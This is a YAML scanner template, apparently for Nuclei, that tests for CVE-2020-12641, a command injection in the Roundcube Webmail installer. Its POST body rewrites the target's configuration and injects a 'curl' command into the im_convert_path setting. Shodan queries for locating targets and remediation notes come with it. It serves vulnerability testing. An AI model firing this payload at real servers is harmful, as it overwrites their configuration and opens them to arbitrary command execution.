http:
- body: _step=2&_product_name=Roundcube+Webmail&_support_url=&_skin_logo=&_temp_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Ftemp%2F&_des_key=aaCGmrf1vc2NIJ8whIA3aG9x&_enable_spellcheck=1&_spellcheck_engine=googie&_identities_level=0&_log_driver=file&_log_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Flogs%2F&_syslog_id=roundcube&_syslog_facility=8&_dbtype=mysql&_dbhost=localhost&_dbname=roundcube&_dbuser=roundcube&_dbpass=roundcube&_db_prefix=&_default_host%5B%5D=localhost&_default_port=143&_username_domain=&_auto_create_user=1&_sent_mbox=Sent&_trash_mbox=Trash&_drafts_mbox=Drafts&_junk_mbox=Junk&_smtp_server=localhost&_smtp_port=587&_smtp_user=%25u&_smtp_pass=%25p&_smtp_user_u=1&_smtp_log=1&_language=&_skin=elastic&_mail_pagesize=50&_addressbook_pagesize=50&_prefer_html=1&_htmleditor=0&_draft_autosave=300&_mdn_requests=0&_mime_param_folding=1&_plugins_autologon=autologon&_plugins_enigma=enigma&_plugins_zipdownload=zipdownload&submit=UPDATE+CONFIG&G&_im_convert_path=curl+http%3a//example.com
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Roundcube Webmail Installer
    - The config file was saved successfully
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/installer/index.php'
  - '{{BaseURL}}/roundcube/installer/index.php'
id: CVE-2020-12641
info:
  author: domwhewell-sage
  classification:
    cpe: cpe:2.3:a:roundcube:webmail:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-12641
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99792
    epss-score: 0.93275
  description: 'Roundcube Webmail before 1.4.4 contains a command injection caused
    by shell metacharacters in configuration settings for im_convert_path or im_identify_path,
    letting attackers execute arbitrary code, exploit requires attacker to control
    configuration settings.

    '
  impact: 'An attacker can exploit this vulnerability to execute arbitrary commands
    on the server, potentially leading to a full compromise of the system.

    '
  metadata:
    max-request: 2
    product: webmail
    shodan-query:
    - http.component:"roundcube"
    - cpe:"cpe:2.3:a:roundcube:webmail"
    vendor: roundcube
    verified: true
  name: Roundcube Webmail - Command Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-12641
  - https://github.com/mbadanoiu/CVE-2020-12641
  - http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00083.html
  - https://github.com/roundcube/roundcubemail/compare/1.4.3...1.4.4
  - https://github.com/roundcube/roundcubemail/releases/tag/1.4.4
  remediation: 'To remediate this vulnerability, update to Roundcube Webmail 1.4.5,
    1.3.12 or later.

    '
  severity: critical
  tags: cve,cve2020,roundcube,webmail,intrusive,kev,vkev,vuln
